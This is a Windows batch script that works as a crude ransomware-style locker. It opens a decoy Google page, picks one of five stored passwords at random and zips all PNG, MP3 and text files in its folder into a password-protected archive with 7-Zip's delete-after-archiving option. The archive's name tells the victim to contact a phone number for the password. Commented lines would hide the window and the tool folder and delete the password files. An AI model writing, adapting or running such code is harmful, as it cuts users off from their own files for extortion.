@echo off
::mode 20,1
::this will run the program in hidden mode
::powershell -window hidden -command ""
::attrib +h 7z
start /min "" "https://www.google.com/"
::this will set var for password that is inside Readme file
::set /A ran=%RANDOM% * 5 / 32768 + 1
set /A ran=%random% %%5 +1
echo %ran%
pause
if %ran% == 1 set /p password=<"pass1" && set id=2z65Wc6 && echo 2z65Wc6 | clip
if %ran% == 2 set /p password=<"pass2" && set id=stq2vBR && echo stq2vBR | clip
if %ran% == 3 set /p password=<"pass3" && set id=4tzVBPL && echo 4tzVBPL | clip
if %ran% == 4 set /p password=<"pass4" && set id=zCQ86bw && echo zCQ86bw | clip
if %ran% == 5 set /p password=<"pass5" && set id=9FwxgFf && echo 9FwxgFf | clip
echo %id%
pause
::this will zip the file .png and mp3 with password
7z\7z -sdel a -tzip Contact_0932152322_for_password "*.png" "*.mp3" "*.txt" -p%password%
::this will delete the file ReadME where the password is stored
::del /s /q pass1
::del /s /q pass2
::del /s /q pass3
::del /s /q pass4
::del /s /q pass5
exit